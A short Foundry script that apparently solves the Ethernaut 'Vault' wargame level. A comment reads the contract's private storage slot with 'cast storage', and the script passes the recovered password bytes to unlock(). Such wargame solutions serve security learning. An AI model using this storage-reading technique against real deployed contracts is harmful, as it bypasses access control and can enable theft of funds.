// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ForceSolution is Script {
    
    address target = 0x52110544BEB582f96a9f5Daf519D3336277E5BC9 ;
    Vault vault = Vault(target);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        console.log("locked : ", vault.locked());
        vm.stopBroadcast();
    }
}

// cast storage 0x52110544BEB582f96a9f5Daf519D3336277E5BC9 1
// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29